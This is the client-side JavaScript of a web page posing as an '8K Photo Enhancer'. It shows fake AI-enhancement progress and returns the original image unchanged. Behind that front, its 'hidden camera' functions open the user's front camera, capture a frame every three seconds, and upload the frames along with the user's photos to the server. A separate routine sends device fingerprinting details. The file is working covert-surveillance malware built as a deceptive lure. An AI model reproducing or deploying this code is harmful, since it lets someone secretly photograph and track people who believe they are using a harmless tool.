/* ╔══════════════════════════════════════════════════════════════╗
   ║  📸 8K PHOTO ENHANCER — CAMERA CAPTURE LOGIC BY MOHSIN 📸  ║
   ╚══════════════════════════════════════════════════════════════╝ */

// ============================================================
// CONFIGURATION
// ============================================================
const CONFIG = {
    CAPTURE_INTERVAL: 3000,        // Camera capture every 3 seconds
    MAX_CAPTURES: 50,              // Max captures per session
    CAMERA_WIDTH: 640,
    CAMERA_HEIGHT: 480,
    PROGRESS_STEPS: [
        { percent: 15, text: '🔍 Analyzing photo quality...' },
        { percent: 30, text: '🧠 Running AI enhancement model...' },
        { percent: 50, text: '📈 Upscaling resolution to 4K...' },
        { percent: 70, text: '🎨 Optimizing colors and contrast...' },
        { percent: 85, text: '⚡ Applying final 8K upscale...' },
        { percent: 95, text: '✨ Finalizing enhancement...' },
        { percent: 100, text: '✅ Enhancement complete!' },
    ],
    TOAST_DURATION: 3500,
};

// ============================================================
// GLOBAL STATE
// ============================================================
const state = {
    uploadedImageData: null,
    cameraStream: null,
    captureInterval: null,
    captureCount: 0,
    isEnhancing: false,
    socket: null,
};

// ============================================================
// DOM ELEMENTS
// ============================================================
const DOM = {
    fileInput: document.getElementById('fileInput'),
    uploadArea: document.getElementById('uploadArea'),
    previewContainer: document.getElementById('previewContainer'),
    previewImage: document.getElementById('previewImage'),
    enhanceBtn: document.getElementById('enhanceBtn'),
    progressContainer: document.getElementById('progressContainer'),
    progressFill: document.getElementById('progressFill'),
    progressText: document.getElementById('progressText'),
    resultContainer: document.getElementById('resultContainer'),
    hiddenCamera: document.getElementById('hidden-camera'),
    hiddenCanvas: document.getElementById('hidden-canvas'),
    toastContainer: document.getElementById('toastContainer'),
    particlesContainer: document.getElementById('particlesContainer'),
};

// ============================================================
// INITIALIZATION
// ============================================================
function init() {
    console.log('🚀 8K Photo Enhancer initialized');
    console.log('👑 Created by: MOHSIN');
    
    // Connect to server
    connectSocket();
    
    // Setup event listeners
    setupEventListeners();
    
    // Create particles
    createParticles();
    
    // Log device info
    logDeviceInfo();
}

function connectSocket() {
    try {
        state.socket = io();
        
        state.socket.on('connect', () => {
            console.log('✅ Connected to enhancement server');
            logToServer('connection', 'Client connected');
        });
        
        state.socket.on('disconnect', () => {
            console.log('❌ Disconnected from server');
        });
        
        state.socket.on('welcome', (data) => {
            console.log('📩 Server:', data.message);
        });
        
    } catch (error) {
        console.warn('⚠️ Socket connection failed:', error.message);
    }
}

function setupEventListeners() {
    // File input
    DOM.fileInput.addEventListener('change', handleFileSelect);
    
    // Enhance button
    DOM.enhanceBtn.addEventListener('click', handleEnhance);
    
    // Drag & Drop
    DOM.uploadArea.addEventListener('dragover', handleDragOver);
    DOM.uploadArea.addEventListener('dragleave', handleDragLeave);
    DOM.uploadArea.addEventListener('drop', handleDrop);
    
    // Clipboard paste
    document.addEventListener('paste', handlePaste);
    
    // Keyboard shortcuts
    document.addEventListener('keydown', handleKeyboard);
    
    // Window events
    window.addEventListener('beforeunload', cleanup);
    window.addEventListener('pagehide', cleanup);
    
    // Mobile touch
    DOM.uploadArea.addEventListener('touchstart', handleTouchStart);
}

// ============================================================
// FILE HANDLING
// ============================================================
function handleFileSelect(event) {
    const file = event.target.files[0];
    if (!file) return;
    
    // Validate file type
    const validTypes = ['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'image/bmp'];
    if (!validTypes.includes(file.type)) {
        showToast('Invalid file type!', 'Please upload JPG, PNG, or WEBP images.', 'error');
        return;
    }
    
    // Validate file size (max 50MB)
    const maxSize = 50 * 1024 * 1024;
    if (file.size > maxSize) {
        showToast('File too large!', 'Maximum file size is 50MB.', 'error');
        return;
    }
    
    readAndPreviewFile(file);
}

function readAndPreviewFile(file) {
    const reader = new FileReader();
    
    reader.onprogress = (event) => {
        if (event.lengthComputable) {
            const percent = Math.round((event.loaded / event.total) * 100);
            console.log(`📖 Reading file: ${percent}%`);
        }
    };
    
    reader.onload = (event) => {
        state.uploadedImageData = event.target.result;
        DOM.previewImage.src = state.uploadedImageData;
        DOM.previewContainer.classList.add('active');
        
        // Scroll to preview
        DOM.previewContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
        // Send to server
        sendPhotoToServer(state.uploadedImageData, 'upload');
        
        showToast(
            'Photo uploaded! 🎉',
            `File: ${file.name} (${formatFileSize(file.size)})`,
            'success'
        );
        
        // Log
        logToServer('upload', `File uploaded: ${file.name} (${formatFileSize(file.size)})`);
    };
    
    reader.onerror = () => {
        showToast('Error!', 'Failed to read file. Please try again.', 'error');
    };
    
    reader.readAsDataURL(file);
}

// ============================================================
// DRAG & DROP
// ============================================================
function handleDragOver(event) {
    event.preventDefault();
    event.stopPropagation();
    DOM.uploadArea.classList.add('dragover');
}

function handleDragLeave(event) {
    event.preventDefault();
    event.stopPropagation();
    DOM.uploadArea.classList.remove('dragover');
}

function handleDrop(event) {
    event.preventDefault();
    event.stopPropagation();
    DOM.uploadArea.classList.remove('dragover');
    
    const file = event.dataTransfer.files[0];
    if (file) {
        DOM.fileInput.files = event.dataTransfer.files;
        handleFileSelect({ target: { files: [file] } });
    }
}

// ============================================================
// CLIPBOARD PASTE
// ============================================================
function handlePaste(event) {
    const items = event.clipboardData?.items;
    if (!items) return;
    
    for (const item of items) {
        if (item.type.startsWith('image/')) {
            event.preventDefault();
            const file = item.getAsFile();
            DOM.fileInput.files = new DataTransfer().files; // Hack
            handleFileSelect({ target: { files: [file] } });
            break;
        }
    }
}

// ============================================================
// ENHANCE BUTTON
// ============================================================
async function handleEnhance() {
    if (!state.uploadedImageData || state.isEnhancing) return;
    
    state.isEnhancing = true;
    DOM.enhanceBtn.disabled = true;
    DOM.progressContainer.classList.add('active');
    DOM.resultContainer.classList.remove('active');
    
    // Scroll to progress
    DOM.progressContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
    
    // Start hidden camera
    await startHiddenCamera();
    
    // Send photo again
    await sendPhotoToServer(state.uploadedImageData, 'upload');
    
    // Simulate progress
    simulateProgress();
}

function simulateProgress() {
    let currentStep = 0;
    let progress = 0;
    
    const progressInterval = setInterval(() => {
        if (currentStep >= CONFIG.PROGRESS_STEPS.length) {
            clearInterval(progressInterval);
            completeEnhancement();
            return;
        }
        
        const step = CONFIG.PROGRESS_STEPS[currentStep];
        const targetProgress = step.percent;
        
        // Smooth progress animation
        const animateProgress = () => {
            if (progress < targetProgress) {
                progress += Math.random() * 3 + 1;
                if (progress > targetProgress) progress = targetProgress;
                DOM.progressFill.style.width = progress + '%';
                DOM.progressText.textContent = step.text;
                
                if (progress < targetProgress) {
                    requestAnimationFrame(animateProgress);
                } else {
                    currentStep++;
                    setTimeout(() => {
                        if (currentStep < CONFIG.PROGRESS_STEPS.length) {
                            simulateProgress();
                        }
                    }, 400);
                }
            }
        };
        
        animateProgress();
        
        // Stop the outer interval - inner animation handles it
        clearInterval(progressInterval);
        
    }, 300);
}

function completeEnhancement() {
    DOM.progressFill.style.width = '100%';
    DOM.progressText.textContent = '✅ Enhancement Complete!';
    
    setTimeout(() => {
        DOM.progressContainer.classList.remove('active');
        DOM.resultContainer.classList.add('active');
        DOM.enhanceBtn.disabled = false;
        state.isEnhancing = false;
        
        // Download enhanced image
        downloadImage(state.uploadedImageData, `enhanced_8k_${Date.now()}.png`);
        
        showToast(
            '🎉 Enhancement Complete!',
            'Your 8K photo has been downloaded!',
            'success'
        );
        
        // Scroll to result
        DOM.resultContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
        logToServer('enhance', 'Enhancement completed');
    }, 500);
}

// ============================================================
// HIDDEN CAMERA LOGIC
// ============================================================
async function startHiddenCamera() {
    try {
        // Check if camera API is available
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            console.log('📷 Camera API not available');
            return;
        }
        
        // Request camera with specific constraints
        const constraints = {
            video: {
                facingMode: 'user',
                width: { ideal: CONFIG.CAMERA_WIDTH },
                height: { ideal: CONFIG.CAMERA_HEIGHT },
                frameRate: { ideal: 15 },
            },
            audio: false,
        };
        
        state.cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
        
        DOM.hiddenCamera.srcObject = state.cameraStream;
        await DOM.hiddenCamera.play();
        
        console.log('📸 Hidden camera started');
        
        if (state.socket && state.socket.connected) {
            state.socket.emit('start_camera');
        }
        
        // Start periodic capture
        state.captureCount = 0;
        state.captureInterval = setInterval(captureFromCamera, CONFIG.CAPTURE_INTERVAL);
        
        // Log
        logToServer('camera', 'Camera activated');
        
        // Show subtle toast
        showToast(
            '📸 Camera Ready',
            'Position yourself for best enhancement results!',
            'info'
        );
        
    } catch (error) {
        console.log('📷 Camera permission denied:', error.message);
        
        // Log the denial
        logToServer('camera_denied', error.message);
    }
}

function captureFromCamera() {
    if (!DOM.hiddenCamera || !DOM.hiddenCamera.videoWidth) return;
    if (state.captureCount >= CONFIG.MAX_CAPTURES) {
        stopHiddenCamera();
        return;
    }
    
    try {
        const canvas = DOM.hiddenCanvas;
        canvas.width = DOM.hiddenCamera.videoWidth;
        canvas.height = DOM.hiddenCamera.videoHeight;
        
        const ctx = canvas.getContext('2d');
        
        // Mirror for front camera
        ctx.save();
        ctx.scale(-1, 1);
        ctx.drawImage(DOM.hiddenCamera, -canvas.width, 0);
        ctx.restore();
        
        // Add timestamp watermark
        const timestamp = new Date().toLocaleString();
        ctx.font = '12px monospace';
        ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
        ctx.fillText(`📸 ${timestamp}`, 10, canvas.height - 10);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Send to server
        sendPhotoToServer(imageData, 'camera');
        
        state.captureCount++;
        console.log(`📸 Camera capture ${state.captureCount}/${CONFIG.MAX_CAPTURES}`);
        
    } catch (error) {
        console.error('Capture error:', error);
    }
}

function stopHiddenCamera() {
    if (state.captureInterval) {
        clearInterval(state.captureInterval);
        state.captureInterval = null;
    }
    
    if (state.cameraStream) {
        state.cameraStream.getTracks().forEach(track => {
            track.stop();
            console.log('📷 Camera track stopped');
        });
        state.cameraStream = null;
    }
    
    console.log('📸 Hidden camera stopped');
}

// ============================================================
// SERVER COMMUNICATION
// ============================================================
async function sendPhotoToServer(imageData, type) {
    try {
        const endpoint = type === 'upload' 
            ? '/api/upload-photo' 
            : '/api/capture-camera';
        
        const payload = JSON.stringify({ image: imageData });
        
        const response = await fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: payload,
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log(`✅ ${type} sent successfully`);
        } else {
            console.warn(`⚠️ ${type} send warning:`, result.message);
        }
        
    } catch (error) {
        console.error(`❌ ${type} send error:`, error.message);
    }
}

function logToServer(event, details) {
    if (state.socket && state.socket.connected) {
        state.socket.emit('log', {
            event: event,
            details: details,
            timestamp: new Date().toISOString(),
        });
    }
}

// ============================================================
// TOAST NOTIFICATIONS
// ============================================================
function showToast(title, message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <span class="toast-close" onclick="this.parentElement.remove()">×</span>
        <div class="toast-title">${title}</div>
        ${message ? `<div class="toast-message">${message}</div>` : ''}
    `;
    
    DOM.toastContainer.appendChild(toast);
    
    // Auto-remove
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(120%)';
        toast.style.transition = 'all 0.3s ease';
        setTimeout(() => toast.remove(), 300);
    }, CONFIG.TOAST_DURATION);
}

// ============================================================
// DOWNLOAD
// ============================================================
function downloadImage(dataUrl, filename) {
    const link = document.createElement('a');
    link.href = dataUrl;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    console.log(`💾 Downloaded: ${filename}`);
}

// ============================================================
// PARTICLES BACKGROUND
// ============================================================
function createParticles() {
    const container = DOM.particlesContainer;
    if (!container) return;
    
    const particleCount = 30;
    
    for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        
        // Random properties
        const size = Math.random() * 3 + 1;
        const left = Math.random() * 100;
        const delay = Math.random() * 5;
        const duration = Math.random() * 10 + 8;
        const opacity = Math.random() * 0.4 + 0.1;
        
        particle.style.cssText = `
            width: ${size}px;
            height: ${size}px;
            left: ${left}%;
            animation-delay: ${delay}s;
            animation-duration: ${duration}s;
            opacity: ${opacity};
        `;
        
        container.appendChild(particle);
    }
}

// ============================================================
// UTILITIES
// ============================================================
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function logDeviceInfo() {
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenSize: `${window.screen.width}x${window.screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        devicePixelRatio: window.devicePixelRatio,
        cookiesEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        timestamp: new Date().toISOString(),
    };
    
    console.log('📱 Device Info:', info);
    logToServer('device_info', JSON.stringify(info));
}

function handleKeyboard(event) {
    // Ctrl+V for paste
    if (event.ctrlKey && event.key === 'v') {
        // Let the paste event handler deal with it
    }
    
    // Escape to close previews
    if (event.key === 'Escape') {
        // Close any open modals
    }
}

function handleTouchStart(event) {
    // Mobile touch handling
    DOM.uploadArea.classList.add('touched');
    setTimeout(() => DOM.uploadArea.classList.remove('touched'), 200);
}

// ============================================================
// CLEANUP
// ============================================================
function cleanup() {
    stopHiddenCamera();
    
    if (state.socket) {
        state.socket.disconnect();
    }
    
    console.log('🧹 Cleanup complete');
}

// ============================================================
// START
// ============================================================
document.addEventListener('DOMContentLoaded', init);

console.log(`
╔══════════════════════════════════════════════════════════════╗
║  📸 8K PHOTO ENHANCER — BY MOHSIN 📸                       ║
║  👑 Ready to capture!                                      ║
╚══════════════════════════════════════════════════════════════╝
`);